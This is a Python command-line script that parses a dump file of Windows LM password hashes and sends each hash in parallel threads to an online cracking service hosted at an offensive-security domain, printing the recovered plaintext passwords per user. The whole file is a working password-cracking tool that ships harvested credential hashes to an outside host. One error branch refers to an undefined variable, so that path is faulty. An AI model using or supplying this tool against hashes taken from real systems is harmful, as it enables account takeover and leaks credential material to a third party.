#!/usr/bin/env python

from threading import *
import click
import requests
import re
import sys

screenlock = Semaphore(value=1)
template = '{user:20}{result:10}'

def submit_hashes_to_service(user, hash_value, priority_code):
    results_pattern = re.compile(r'The plaintext is\s+-\s+(.+)<')
    post_payload = {
        'hash': hash_value,
        'type': 'lm',
        'method': 'table',
        'priority': priority_code,
    }

    response = requests.post('http://cracker.offensive-security.com/insert.php', data=post_payload)

    screenlock.acquire()
    success = True
    if response.ok:
        result = results_pattern.findall(response.text)
        if len(result) == 1:
            result = result[0]
        else:
            success = False
            result = 'Pattern recognition failure.'
    else:
        success = False
        result = 'Form submission failure for hash: %s -- %s.' % (lm_hash, response.status_code)

    if success:
        click.secho(template.format(**{'user': user, 'result': result}), fg='green')
    else:
        click.secho(template.format(**{'user': user, 'result': result}), fg='red')
    screenlock.release()

@click.command()
@click.option('--hash-list-file', required=True, help='File containing LM hashes to decrypt.')
@click.option('--priority-code', required=True, help='Code required to use the online cracker.')
def decrypt_hashes(hash_list_file, priority_code):
    hash_list = []
    hashes = ''
    
    try:
        with open(hash_list_file, 'r') as f:
            hashes = f.read()
        hash_list = hashes.split('\n')

        click.echo('')
        click.echo(template.format(user='Username', result='Result'))
        click.echo('-----------------------------------------------------')

        for hash_item in hash_list:
            if hash_item == '' or hash_item.count(':') != 6:
                continue
            lm_hash_list = hash_item.split(':')
            user = lm_hash_list[0]
            lm_hash = lm_hash_list[2]
            if len(lm_hash) != 32:
                continue

            t = Thread(target=submit_hashes_to_service, args=(user, lm_hash, priority_code))
            t.start()
    except Exception as e:
        click.secho('Error: %s.' % e, fg='red', bold=True)

if __name__ == '__main__':
    decrypt_hashes()